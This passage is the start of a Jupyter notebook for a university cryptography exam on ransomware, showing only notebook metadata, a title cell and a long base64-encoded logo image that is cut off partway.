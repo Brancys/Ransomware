{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# **${\\Large\\text{Criptografía 2024-30 - Parcial 3 - Ransomware}}$**\n",
        "\n",
        "![uninorte_logo.jpg](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAQEBAQEBAgICAgICAgICAgICAgICAgICAgICAgICAgICAgL/2wBDAQEBAQEBAQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgL/wAARCADIAV4DAREAAhEBAxEB/8QAHwABAAIBBQEBAQAAAAAAAAAAAAkKCAMFBgcLBAEC/8QAYRAAAAYCAQIEAQQGEBALCQAAAQIDBAUGAAcICREKEhMhFBUiMUEWMjlReLcXGBojMzQ3OFdYYXF2lbbWJCcoQkNEVnN3eYGWtLW41TZSU3J0dYSRssPTJjpUVWJjhpei/8QAHgEBAAICAgMBAAAAAAAAAAAAAAMEAQIFCAYHCQr/xABaEQABAwICBAcICQ8JCAMAAAAAAQIDBBEFEgYhMVEHEzNBYXGBCBQiMpGxwfAVNnJ0daGys7UjNDU3OEJDUmJzdoKS0dIJFxlTVIOTtMIWJFWVotPU8USE4f/aAAwDAQACEQMRAD8Av8YAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYBpqqpoJqLLKERRRIdVVVU5U00k0y+Y6ihzewFAPcRH2APccAo1676xE6vyg0nzFldiWL8rrt/rZcrOMisc/sEonUmnG6V4r601Jq+XcQ4LC1Tax79GNuI+VISpOHEk4D88eOTqVkk13/KX0f+y2sWq35KL23X/wBF5jLJUGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgEIPiEObocJ+mpuB7XZkIvbnINI3HPUYIqphItpfYsa4QudpZpiYDl+Ra2lLP01yAPpPiMCCJTLE7xSuys6SaBmeTq1nnZW5skHRw0EzS8yKJepxybbJ+iYyZ0Uy8StbJk9FQvuUSh9qIe4CACGVLeAnunF38N+qnnU9Kjok82fy+fTj0Ft6akyyO0KlCjpfd3c5zug2rq5BGCmJZ76giPnm2XyfYS/V6cuQA+jtl2N2ZpQlZkfYljzcjGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwBgDAGAMAYAwDzKvFCc5S8peoKpoeoTYSOpuFsM81s3K0citGSm67T8PMbgmSFD5oqR4IxdcEfcUnMTIlKPZY3enK7M/qOQp2ZWX3kadu+476C/xoPJ3/ZP1vmlvBTrX0En4Vfcp51JnvCac3CaU5ibC4c3CYTZ0TlpXAsFFI9cJIs2W99XRqrxBm3O4OUpFJ+t/HICBfnuXUJFtyAZQ5AyWF1nW3+chqWXbfd5j0Y8tFEYAwBgGwObVV2S6zV5ZIBo5bm8i7dzMR6C6BwDzCVZJVQDFHt79hAMxdAb6Q5FCFUTMU6ZylOQ5DAYhyGDzFMUxfYQEPoHMg2BO21RVYjdKzV5VwqqVBNBOajTrKLnP6ZESJlU7iYTewFAO4j7fTi4PtkJuFiBSLLS8XGGXA4oFkH7VkKwJ9vUFIHJy+by9w79u/buHf6cA+lk/YyTcruOeNH7Q4nKR0ycIum5zJnFNQpVkBMURKYBAff2EBAffAPif2GAi1wbSc5DxzkUyqg3fybJouKRhEpVQScHKbyiICAD27dwH72LoD6TSsYWP+VjSLAsX6RV/lIzxuEf6Jx7EW+ME3p+UREOxvN2HAPlY2Kvya/w0bOw0g58hlfh2Mmydr+kQQA6npIHMbyh3DuPbsHcMXQHzJ2+prKJoo2iuqqqqESSSTm406iqqhvImmmQqncTGEQAAD3EfYMxdAcizIOPubXVmSyzZ5ZYBo5bGEjhu5mI5BZA4B5hIskqoBij29+wgGLg1XdlrjA5En1ghGSiqKblJN3KsW51G636EuQiygCJDdh8pg+aPb2HFwfL9mdP/urrX8exf/q5i6A+tjY69JuAaxs9DSDoSGUBsxlGLtwKZPtzgigcxuwd/ce3YMzdAabm01hk4VaPLHAtHSBvIu2cy8eg4RP5fN5VUVVAMUewgPYQ+gcxdAaRLhUlDFInaa4c5h7FISbjDGMI+wAUoK++LoDkQCBgAxRASiACAgPcBAfcBAQzINFy5bs267t44RatWyR13LlyqRBu3QSL51Fl1lRApSlD3MYwgAB7jgHV8XvnRs5MEr0JubVExPqK+gnBxexKhITB1xHygiSMaPDrCbv7eUCd+/1Zi6GbKdr5kwcfWttVbLKtnFmr7dwgoZFdBaZjklkViG8p0lUjqAYpgH2EogAgOLg3J9JxsWgV1JyDGObGOVIrh87QaIGVOAmImVZwYpRMIAIgHfuIAP3sA2j7M6f/AHV1r+PYv/1cxdAb82ctniJHLRwg6bqh3SXbKproqB37dyKpCJR/yDmQa+AbK9sldjXAtJGehY90UhFDNnsoxauCkU+0OKK5ym7D9Q9uw/Vi4NxZvGcg3TeMHbZ80W83ouma6Tlur5Dimf010REpuxgEo9h9hAQ+kMA0ZCVjIlIi8rIsIxFRT0k1pB43ZpKKiUTgkRRwYoCbsAj2D37AI/VgG0/ZnT/7q61/HsX/AOrmLoDf0HCDpFNw2WSct1S+ZJdBQiyKhf8AjJqJiICH7oDmQa2AMAYBUS8W5Z9oE0zwW1dr3Y1poUdtPkNdmtkQr1ln60xnV67rkzqvBYj11VJZy3aKuFlk0DCdMFhIt6YqJJmJw2PYlHg+FzVT2ucyCNZHtZbM5EtqbdUS+vnU834OdDq3hC02w3A6aWGCoxSqjo4ZqjPxET5EcqPl4trn5Ey68rVXoKXX5AHIbv3/ACfp7v8Af/JE2h3/AO/1s9VfzyYD/ZKz9qH+M7s/0efCd/x7R79jEv8AxTGSzXDbdSsc5WXO3dmru4CUdxTlwz2XfiNllmanpnVb+o+KfyD9XmAB++Gez8Mro8Vw2CpYjmsnibK1rvGa16XRHWVUvvstjpZpporV6EaX4ng1RJFNPhdbPQzTQZuJkkp35HPi4xGvyOXW3M1Hb0N61/L7l2VaWdRjty7JZu37WQcEcSuzdhKMypsGpnSpFCoPTm+cUvYPm9u/0+2UtIccp9G8LfVysfIxjo2K2O2dVkdlS2ZUbqXaeQcE/BlivC9pxT4DQ1FLSVNTDVTNnq0l4hraSF070dxLHyXc1tm2ba+3Udohw3viqnzrjUDKLKCY6iny6odRVY/mUVVOZATGMYwiYxh7mMYRERERz14vDLgKJ9Z1nlg/jO2zP5PLhQe9E9n9Htaoni4nz/8A1TIeRrDqf6UnHCntnLZB/J9WHk3XkXa/q/BpuTcWdctPXVBMBP6fmDv7FE3b6u+ezq/FIqDBX1jmudHHCtQrG2zq3I1+VLrbNZd9rnTDRjQuv0p4Q6TR6GaGOqrMSTCY6iXP3uyZah9Pxr8rVk4rM3Nqar8vNcx6R4fbAbLIuW11qzR02VTcNnTVWwNXbVwif1EXDVygiVRNQhgAxDkMU5TB3KIDnrL+eTAv7JWeWD+M7m/0enCf/wAe0f8A2cS/8U/Nga/5C66qr22Pd53iVYRyzJJ42idm7OK6SReuAaldiDl0QnpkOYgH+d3ADdw+gc5nR/hJwfSHFGUkcNRC+RHqx0qx5FVjc2TwHKuZURcurmseuOFbuOuEDgl0IqceqsQwqvpaSSnZUQ0LaxJ2R1MqQJP9XgjZxUcj40k8LMiPRURURTHxDY+1Hjls1Da+0vO7ct2pDKbLvRilO5WKgQx/6P79gE3v9fbPYMr0ihc7mY1zv2UVy9uo6qUlKtZWQwtsjp5oYGquxHTSNiaq212RXIq2122GWn5X3kOCnk/J/nQN5/IJg2JtEPfv5e/st3z1H/PLgOW/edZsv40P8Z31/o7+E/jcvs9o942XxMS32/spe18KDc9h2Xp67grmwbzZr0bWvMHaFIrTqzz8xY1oaDb0iry7iGiH06qs4TY/KDt67Rb+YCJKO1hIQnnEM9xYbUtraKKZEVEljZI1FtdEexr0Rbaroi67c50I0mwebR7SGtoJHMfJQ1dTRyPjzZHyUs8kD3szIjsjnRqrcyIuW10QpG9dZMg9V3qOCIe/5Nkt9Y/sdw+JfGcVYeSQ9X7jL+tu4+f4ENUfyDYZdTYcc/xl61PIm4ZpkDqXcWh7fRz9099Y/tkWOUU2nJP5Jfcr5iz94zIpTbI6ffcO/al8kfv/APzql/eyafahBS7F7DCLw0/Vk/KXcgi8Qt3Wb4Pi9ybtTBvWZaZfilD6Y39K+lDwc8KzkfTaw1q8reIlxHyItpMkRJHOij8qKqaxPyr0L5zaojzNvzp5jS8WwQpuqdUxEO/9SDqT6x/ZEumYm5TsT0mabk+0nJ2iUPzHzEl7e35RDTft/wDn0Hkq8h5POQJ9c9qkD3hOCFL1XnggHv8AlTt1/WP919QzSHxuwnqeT7TAzrYcR5PgJ1P9+UyjNlatWLBcI7k3x/kGSS7NrE1/YsspcY1CFP39i1+zt5WLR8g/nZI1D74ZHI3K9fKnr1m8Ts8fxKemtxt5qUPcfT21jzxmn6DGlTfGptvW+rogUiUCtW6YpN7NjfKI9gNGPmUk0MX27HbCHtlxHIrL9Bx7m2fbpseXlw11HburV1WKDAXZB5Ir8peSNo3bu9QDD6kZrEJ91tfZ7VRQ3sQhYhI0G179igs4Zol+kpcpt8N3XtOQevFxdSWJL/FisGTHqlVhiyaoM2TLh9pZmzaNUyt2zRo2u1wRbtmyCXYpEyEACkIUAKUoAAB2ySbxuwjpeTXr/cce4SeGW5Rc6OLGneWNA5IaApFP3PAyU/CVW4QGx3lkhm8ZZXtYVbyrmGRM1OcyrFRQooiJfTOQPpAc1bE96XSxl9Q1jrWXUT69G7w7PJDpsc3oTlLs7kBo/YtWi9WbIoKlaoULfmFgUf3YrAGb4i1iRK29FH4M3qgJwP8AODygPv2ljic111sQSzpI2xUi68h023V46grs5BODfbsY4MUDeUTgjqSuqCUBH7/bIH8o7r9CFqHkkM/9weGS5Eaq4PTfOOK5QaYtcBWdANeRsrrt1UrXSJv7DwpKd+loiNtr2QdszyTdkY5W5Fm7dJ85TKiVRAyxO2yxOy31bLkaVCK+1uexzrwtvOPkTS+oHS+IS+wrlcePu/Kbswz7XdnnZixwtFuFDpDq/wAJeaU2lVlfklRRONXi5JFr6TR6i8RVconcM2qhMwuVHW5lFSxuS/OcE8Thz25D7h5+bi4lr3C2VjjtxuLTa3BaliJSRha/erZM0KOvM5sO8sGJyhLrKnlisoojsq7VixalUaIEcvHaq2JXKr16BTsajL86nFtieH2oVq4sVHfvTa5p6u6hm4SoU5/eOP2rIugV+8t2thOi1mpSjMzT4yrdSDcrAq8jp9kxffJyTl2Y7Zw3Fmo4q6XRb+vrtMpMqO1tt0lpjw5Nc6qem9XbY48dRDVO1q9rullqc/xrvG2rjUrdZWEdIfFRty1So+jJmUlFGLAUWD+IB/2KzTdPWSK3wybRu3mhzomsrTrGq3TtKF3VQTIPU/6gY9vp5q78+sf2UXmVneO7rLsXJp1F4LxYZQN0ldUAP0flqtC/i6tf3ssz+L2lOm5TsKZfTQ6R/Ifqpu91x/Hq56eqL7RcdSJGyI7ambhDJzQX9WVRhW8AvVYiX+cQ0O4+IM5KgUnqI+QVO5/JA1iv2FuSVse3nPogdo9R3oZcy5ijNLfZdW7b1XJwL656q+zN/atGbhpsq3JMxqMtCpq/J0pCzTMwlbySTdtLRq3qCipHSjJVNLHhMd0izJmetz1ROM/J/XvJnirqDlrXXSUFrza2ooDbRhlXaQFqkfIQIS9gjJl8IEJ54hUrlq8V7FICjVUwdi5dRbpc45zVa6x5MvNveGw+pNzg5b8nazCTtraWF7sba0SwbgLpxT+NGmYkkXXpR0QO3ptYusMmLp75Q/TCy5wKJ1B70lXMqqckxEjYiety3T4P3mH9kmpOQ/BWzSnqSmpbCjvnU7RdRRRU2vNjuixGwoll6giAIxljSQfGKUPZSzZNA7anaVqputF7DubxhpQNwM41APv/AFX8J+Jm4ZmfYhil8ZeoqL9NPo5cluqjX93z/Ha56Xq46IkabFWGN2zO3KDczz68R0hJw5K+4q8NLpAUpY1Yq53QoeU50vIBy+cSwtYryzJK2O1zS1VyQ6iXQ25lz1KCft1Gv2nbTFNdvce5i3P7FprbNWdM0ZtJg5iPWUjnDOainJHELYmCLeSZC4RdIKorJLtcwiujcFayZvpPVw0JuWo8itIai33QVlFqVuXW9M2bVxXFMXSULda+hYGLV76QiUF0SLgiuUB+YsQ5fqy6i3Q41yZVsdtZkwMAqG+K/wD0h0xvwmNm/ixJnhvCB7T8Q96yedh757mD7oLRH4ap/kTFZoPpD98M6cn6ByH3cP6q+x/4Yzf+lDncXQ/2p4b7zh+Sfn04f/t56X/pBiXz6nPOLn6s9f8A+qrL/qdTOA4UvaXP+epvnUPaPcTfdFYV7wxn6PkJSkP0ZH++p/8AjDOq7/FXqU+38HLM903zodWQ33Obit/jjuTP+zTrvO32kftCqfg1f8u0+AfBD907gn6YN+k5js8fpH9/OoZ99zYrRX29rrc/WHYB6E/EPoowm+hNR0gJG63v/wAmr5Dh+6XL+F4hJhOJQVLfGgmZL1o1yK5P1m3b2ni+m+ilJp3obiuCzonFYpQVNEt/vXTxubFJ1xTcXKnSwhqZNXLGwsGLwgpPGNhZMnaQh2FN00liN3BBAfvHKIZ3Omljnw58jFux9O97V3tfErmr5FQ/O3h1DV4XpXTUtQ1WVFLi1NTTsXUrZoK+OKVvZIxyE3P9tf8AaP8AzM6Pfgv1fQfpVX68/vP9Ra68Jt+sf5Tfh7bf/F9Uc7xaOfYKj960/wAxGfmz4U/tmaQ/DmL/AEjUlLfrvx75j1Yuos3dtVm67jcTh6gkomYDqtJPWEI9j10y/WVVJQhyCH2wGDtlyXxlPFYeSQ9Vzi5MxDzitx1sLWTYrwLrj9qOZbTKbpEYxaIX1zHvkZMj3v6foGREFQV83k9P53ft75dTYcc7xl6zyPuDpTT3Ut4kfIofKYTHPXS7uLFn+fg/auuQzB83cNhJ9sQ6P56UQ9hJ876Mot2ock/kl9yvmLPfjMP1SOn3/Avkj/rql5NPtQgpdi9hX3uvTWsr3pMaL6mmtWkxYK2fY+4NT8pIP57xKmIxG0HNX1XtKLKkHmQiliClBTgGHytX54p+QQSdvTIRZbMv5SZJPqqt8hi5yy5hbX5my2kbbut0Sb2Bpvj1SeOzu7qLrLzGw4PXdimpOsW61mW+2mBYyqTGRcAJvj1WPygp2cO1wzCrdTZrEZ5bl5LaP/ufcT+Ahpv+XsHlheQ8nnKafXPapA/4Tn7q68/BO3X/ACvqGaQeN2E9TyfaTdeLw4cfkgcaNKc2avE+tY+OdxHWuynbVsdRyrqHb75FnESD9Uv9hibQjHJpd/ZMs88P37CObzpquQ0zrOtvICtIdT1Wh+Hd5TcHlZ/ybLkeRlf09r5meS9OUJoTfxl9q7FWjWgD5xaNlYS1xjk4d0khsDFM3YVieaLP9Tt62Jlj+rovR8ZLP4Pbh73/ACzPPKzRf6Mo04zafduEkjB8OyM1vO45hiY4eYPUcDXo0qpO3zmUih3+3Lm8Ddar2EVU7YnaRweLP+6qQP4I+nf5dXLMT+N2ElLya9foQ2Pg/wCHP5281eKmnOUWpeWGn9e6629Ayc5V6ZZLVvGPnIJnG2Z9W3DaQZ1VirHkMdwyWVAGyhieRQoiPnE2aNie9LpbWHzsa61izJ0M+ixyz6Yu9d47Q5C8hNbbjruzdSwVCr8PSbBtSXfQ81F3ALC4knqN/aN0CJHQD0gMgcywn9hKBO4jPHG5m0ryytfsQpTdeNRJHq7dQVVcnqIJbdjFFieUD+dImpK6ZQnkN7D3Dv7D9OV38o7r9CFyHkkNXn9pvqjcW9Xce6vy63puG78fOQWsa9c9Js0OQOydgaZlIBlAx0w2pD6tTSzdqykodm7jjjFOGBkE0RTWjlXKTdQ6JyOREuvVrMM4pyrZNaFmTwmvGjgdIxWyeUVH2LbNj81KjEpa7vlGv1ch6kloSqXDyvRf62iY15IfK7GxmZHQG0quiODEYuIn5MhzfGJPpoEb2kFS5+zmOdda3jP0VefG6XVlddSLRHGDnRXn7bTFmcNLJA3qKuk7WpQ9XhqRuHXLByg7SlYt4PyYnJtnrJ8yQL8G/SfN2rVFqekbl22U1idLGmzUVyec/h9Ooj07KXYeRVgaa72XqbXPwklYNy6Fuss2sVFj1XpGjaxzNan2sTOMm6Sp0/iHUaeRTZeb1l1k25DrlidG5pZZOx62J3vC39V3k1u/cN64Ickti2fdUDG6kktqaUvt7kHNi2BUy0udjYCy0Cbtz4TPJSMWbSjZ1GqyKrh5HqM3DUHCjVw3SaywvdexDURtRLoVUOqf90+6gX4au+/xovMgd47ussRcmnUXgfFhfcldUfhVaF/F1a8sz+L2lOm5TsI7vBmf8M+oV/BzjP8A6wu+awc/Z6SSr+97fQR8eLEsdXmuqyzi4FwzcTNQ4sadgbuVqYh1mU+9s1ntMawkfJ9quETIR7gCH+cDZ03P28ihRHSblOwkpr8X2klV05cS3DnwlvGSqtJVxEbV5Y0q06D16Urj4WVb0zZ+z7TZbrPtCD8/0EaQV2kiqXsCa0jH9jfPJ32vlgTp1evYRI3NUr0ayGDoQ8k+nZxUtHMC2c87tP11LcHHt3xjoNer+rrrsD42ibU+JHdMks8qTF4RiYzdnDMECLAU6yarvy/nZTAbSNWpe+6xNM17rW6zE3pHctGHATqWce9xo2c7vVDTYz7S+xrEqg8YoT2jtlyP2DvbZIxrn01UitfNF2gUFylUQVjSkUKU5DBmrXZXp67TaVueNS4X4woQNwL40mKICUeX0IICA9wEB0zbxAQEMnn2IVqXxl6jG/wZP/AfqG/w845fyVtWYg5+z0maranaQueKIsNZnusHthGvO2LtzWNLaGrFuUZKpKg3tbeuu5xVi9OkI9nCUc/jfUIb55CmTKYA7ds0ltnJqfki9l0MYmahOkP0/GM+k5QkDcc6hIkSdAYqxYqZUXmID2P7+UWC7YU//tiXt7ZYj8RClNyq9ZK7m5GMAqG+K/8A0h0xvwmNm/ixJnhvCB7T8Q96yedh757mD7oLRH4ap/kTFZoPpD98M6cn6ByH3cP6q+x/4Yzf+lDncXQ/2p4b7zh+Sfn04f8A7eel/wCkGJfPqc84ufqz1/8A6qsv+p1M4DhS9pc/56m+dQ9o9xN90VhXvDGfo+QlKQ/Rkf76n/4wzqu/xV6lPt/ByzPdN86HV8N9zj4q/wCOP5M/7NOu87faR+0Kp+DXf5dh8BOCD7p3BP0wb9JzHYrzv8K+8phKb4N4JTB9JTA3N5TAP3w+nOo0XKs92z5SH3qxHN7HVNlVq97z2VNqLxT7KnSi60OEautQXXXtSsonA7l/EIJSPYfcktH94+TKb90VkjG/eMGc5pThXsJpDV033rJXLH+ak+qR/wDQ5E7D1xwI6cpwkcE2A4zmRZqqgjZV2+9rqVVpaxF6VqIXv6noYBcgKr9jO8PiUU/TY2uQgbO07F8pPXePyN5ZMn7zpJQ4/wB8D7+dgeD7FfZPQfKq3fSxz0zt+VkauiVf7tzU/VU+U3dW6Df7F90rxsbMtLjlXheNQWSzeMnq44q5qdVZDK9fzqbyUL+2v+0f+ZnVv8F+r6D7ar9ef3n+otdeE2/WP8pvw9tv/i+qOd4tHPsFR+9af5iM/Nnwp/bM0h+HMX+kak6P8QZ0B9xczttl5s8K0IKybilqxBVbdelJ6ejqqvsFOoMvkuq3yhWScOlHEl0I8qUZIR0i4Zt3zRmwWbO03aCqL3k5Y1VboeGQTIxLKVzo/iV4kWjafccTYHVPUMhdCuY5/WVNR12zIr66LX5Q5/lKtspSJllUm0Q49RQFo9vIoxiiaihDICkocDQ2ltbwifNTqt9RNn0FvDub80hyGpPNfnhXIfW7nUJ3M1ozQCM5CWi0q3x5FqRjDYex31ZWdRrBCIQcLKRMS2eOnakmKT18LIsek2eSRxLe682xCGadFbZO1TITxQ/T35o837zwxlOJ/H+07sYa4q282N4c12bo8QSuu7RK1ZeAQdFt8rHGUFyRi7MT0AVAvoG9QSCJPNtK1zlMU72MRbqSL9C3hRsTT3SUjeJPNfSJqzKWm1chorYuobwvXp5CXoeyLpIHIzlTVp49aHQkI5z37Ec+oQp/f01A9t422ZZSOV95Lp62KcPMzw3HUU0xyU2hROMHHu58huPLaZGX09s6Jtutmrt1SJvu9iqxa21omY52EzC9zRj9b4UEXwt05JA3keemlXWJyKWmTsVutbKWv9gcNeT8t4ZyO4WR2n553ymR4haw16ppokpVSz5bnCXGJkJWBGVVflifURRQWUMf5Q9EQIIEUMbsAzq1eKt67Sqj046/NciB8OZ0s+oPw+6irnb/ACZ4vXPUOtD8c9q08tunrFriUYDZp2y1p7ERHwtWmn7rzrpMnRym9D0gBE3nOURKBtImua4mnkY5mpecujcrOPVQ5Zca95ca74kmerbs1lbdeyC6iXrGilrBEqNYqwNSe39ERrz4eQbD/WuGyRg+jJ3JmSxVa7K5FPLbf9ALrHxbiQYhwYv824inD+PJJxt10yWOmTMFzNgkI1RxZSHBs7FMFkBUIQ3pHIJyFN3KFPi37jkOPittPS26ZfERlwV4J8bOMREWxbBr3XUatsR22BuIS21rWoe3bPlBcN/ZUqk4+fAgp3N/QpECAPlIXtbY3K0oSOzvVSpl4jrpb9QTmJ1DofbvGTi/c9v62b8bdY01a2wNi1zFsU7RCW6zyErDi1tU0wdeoii9aKGMCHpCCxQIoYQOBYZWuV3YWaeRjGa15/3EcOsuFHii9KUSu6u09X+cOsNa09qsxqlDo/IfW8BVa4ycvVZJw0hodlawSQTO4XWWMUgdhUVOb6TZpllTeSK6nVeYl76NunvEI1LqE6hnue8rzDdcXGtX2ynekdt70qV2oZph1rx6hSRla3FWB+usoEoLcWpitTgiv5FDCQC+YN2JLm13sRSrBk1WuRh9Yno09UHkP1IOa249KcO79sHWGy9hNZei3CLtWqmLCxRpNaQ0Id21azk+1dplB02XS7Lt0jd0xHy+UQEdXxuzr0m8UzGx9Rbl5y9NJxzu6QtJ4p2OFa17kBrjRGo7HqNzLqM/WpXIPWOtmzBpCPpFuqZEjWSMD6tyqhFlEQYyLhwQVDIomCVWZo0TnsV2yZJb81/iKofR94D9Z/pzc7NRb+d8FtuJatnVPyLOQsG0uenHQyenLq8QJNyIMmlo7uXVeepMrAyIXuZVWNUaE+a8U80TGvY/YWJXxPZt1mVvXS8Opye2Tyh2XzE4J1CM29V95ySt52xpdvZYOq7BqGznKBEbTZaX9lLlkxlY6cUIEks3I/Qk2Uqs9FFu5bLpC2zJE6905zWGdqNsphFsuI8U5yY0AThNtLTHKO1aek2EPV55vYtfaeq03b4GGcJqMIa/brcqs3Uiy8ySQuzuZT1JAqYfKS7wgqAfT6sqWsvr0m6d7tW+osR+Hs6HmwOm+OwOSnKSQra3JradTQ19B0GoyaNjgtOa2GVQn5uPkLSiUG8jOzD5oxM+UYeePYtY9u2aO3ouHS2TRR5dfOQTzJJqTYVmuoV0Ueqrtvn5zN2trfhdsK2a62Nyp3FeqPamNt1G2ZWKo2LYDqWhJxo2k7Eg5TTcNjlVKRdBJYoD2OmQ3cuQujfmXVzliOWNGJr5i2P4jDiNyT5gdODXWnOM2pZzb2zofkPp63SdPgZOsRb9pWq9SLFGzUso6tL5g1Ejdd42TMUrgyoisUSEMUDCWeVFc3tKsDmtfr3FPDRvS48RNxiPaVON2j+VehlbyjFNrmrqbdusKQtaUIIXAwiU2vC2xM6wNBeOxb9zd0hcrCQQ845AjJE3lt0kDttlMleKvhiepZym3Q2uXOddXQmuLFPBZtuXy7bTgtrchb8ks5KaYYwDavPpoCyz4gej8rz8kmVgn/RBGsgdFJmplsLnbdRq6ojamrX5jOTxAfTu6hvKDevHrQ3DPhfe53hhwy0LXdc6hWrln1nGVh9ZZ9k1+yZzER1mnmb7yRsVGwEIRVygCh12cgcp1CLeofaVrlXUmpDSB7GoqqutTKfg74VTh/ZOJ+kbJzare9oLlNYqgE9uGt1fc/yHCVWfl5Nw/Y1RvHV5J2zKrGR52bJ2og6cprvEHC5VjFUDts2FLa/X4jV9S7Nq2EOnVK8Nfyc1RyZUrvTr467S3fxhsOtKvMM5V/sKiyU9Vruq4fQ9zqkxKXSUiXa/mBu1kWxyNzpERf8AoFWEyIlLG+Jb6k1Esc7Vb4S6yVnqU8TOplzj6JvT41TLcV9gy3MLT+163F7v18vYdbJzoRWtdZ2nWrLZq8w5nvk5wlNpGiX5/RfKOSuZFQh0C+koJd3I5zE1Ecbo2Su16iBnR/TD8RjxlY2uM446Z5Z6Hj72tGr3Vrqbees6MnanEOgs1iF5s0HbUjLHapuHBEDiYDJFWUAoh5hyPJIm8mc+B22xlTww8Lrz+5Gbpjbnz+8mi9Pydh+y3bD6b2dB7O5B7VBy+F7NwcerWXsuiyeyxvMk9nZmUM6ZpqncoMXrgEyhlsLl26jV9QxE1f8A4ei3VKtXaNVq1SahDsq9U6dAQ9Wq8BGJehHQddr8cnEwkPHoB9og2bIpopF/rSEKH1Zb2FDab/gDAKhviv8A9IdMb8JjZv4sSZ4bwge0/EPesnnYe+e5g+6C0R+Gqf5ExWaD6Q/fDOnJ+gch93D+qvsf+GM3/pQ53F0P9qeG+84fkn59OH/7eel/6QYl8+pzzi5+rPX/APqqy/6nUzgOFL2lz/nqb51D2j3E33RWFe8MZ+j5CUpD9GR/vqf/AIwzqu/xV6lPt/ByzPdN86HWMP8Ac4eKn+OQ5Nf7NOu87faR+0Kp+DV/y7T4B8EP3TuCfpg36TmOw3n6Vff9De/6MfOo0fKs92z5SH3sxD7HVHvef5l5hrw6tPxEPbKSup3Ui3iFkjSCP9pyYAykyE/5qyaRx/v2e5+GTCuLrKStamqVjqaRfy4vDjXtY5yfqHzu/k9NOe+tH8d0blf4VFUR4xRtVf8A49Z/u9Y1vQypigkW2xahV5zlXKaq/KUHSragn3cVe3RTF4codzfJM9IJJAJv/pTdJo/veqOcVwV4r3tXVtI5fBqqSV7PzsEb18ronP8A2UPOO7i0G9mNGtHMfjZeXBcfoaaocia+8MUqoGa/yYq2Kn6E45xld/bX/aP/ADM9Tfgv1fQd7V+vP7z/AFFrrwm36x/lN+Htt/8AF9Uc7xaOfYKj960/zEZ+bPhT+2ZpD8OYv9I1J3Byy8TZwf4ecktw8X9jah5Rz160paUalZ5imVDWb6qyEgvAs7CVaDeTFsYulEfRfJFEyzRA3qFOHk8oAY3KrM1FVNeo8JbTve2+o6Ji/F79Nl09RQlNQ8x4VmoYCqySmt9YSSTYB/sirSLuaq5ih9fpJqH7fakMPtmOPZ0me9ZOj17Cfnhxzj4vc+dVE3HxX2pD7LqSD0sRYWqTd/C2yk2EWxXZ63eafNpoSMW9AhgOVN0gQjhLsu0UcNjEWNI1zXJqIXMcxdZ2JyW3zU+LfH3cvI69xtgmaZpDXFs2daIqqNmDyyyMHT4hSZkWcE1lHDRso6OmkYqJF3TdIxxADqkD5wZVcqX3GGtVzrbytj+a/wDp1fsF8yv8xtQfz2yLj29JY71k3p8f7j9/Nf8A06v2C+ZX+Y2oP57Y49vSO9ZN6fH+4sa8TeSlJ5icbtN8n9cRNngqLu6kxt7q8PdGkawtUfFSgnBBtOs4d0+apuA8g+YqDtwT6Oyg5K1cyXK7kyusRHc9PEUcN+nnyat3FbcOrOSNovtNr1MsklM65quu5SprsrxBln4tJk9sNnjHRlU0jAVcDsyFKp7EMoX52RrK1rrErIHvbfUTBcYuQFR5W8edM8k6DGWKFpW8NeVnZVXiba1j2VnjoS1RxJNg0nWkU5eNk3RCHAFSIOnCYG7gVU4e+SNVHJcicmV1jvbMmBgDAI2Opj1Q9FdLHWWuNqb5p21blA7O2GfW0Gy1PD1eZlmk0nWH1rF3KI2mXh0iNvh2CpPOmsqp6xky+l5RMcuj3ow3jjdIuo6t6Z3Wq4g9U2f2bStFtNlUTYWro2JscnQtww1YgLHYKdKr/J5rhU06xLy6LxkzeiRlId1UlmS7ll6qIJvWyh8Mka9TaSJ0e00upv1ouNHSqtOoKlvugbuukhuiBuVhrK2pYCmTLOPZ0mQjo2USmz2qdhzJqKHkkRQBEi5TFIr5zJiBQMfIjBHE6TZYyx4C84dXdRLjRVOU2nK7e6tQ7fO3Svx0NsiOhIq2IPKNaXNSlVXjOuyEm1Kmo4aqHQEjw5jIiQxypmESBs1yPS5o9isdZTI/aW09caR15b9s7du1b1zrSgwrqxXK726Vawtdr0MzAPWeSMg7MUhe5hKmkQO6i6x00ESKLKEIbKqiIYRFVSsDuHxefT8pNkeQeptOcl97RTF0s1G6RVdp2u6xKFRVEgPYFvsCWaS6qBwDzJmdxTExgH7Tt2EYVnbzIqlhKV67kMp+FPiX+nDzEv8AXdRyklsTjPs63PmsPU4nfkLBRNRtM+/cFbR9ehdkVSRlIhN64OYCNkJVaLM6VErdr67hRNI2zZmqu40fBI1N/UWFclISGjqY9b3i90sdlax1dvnXm9blO7Vo8xfoB5qev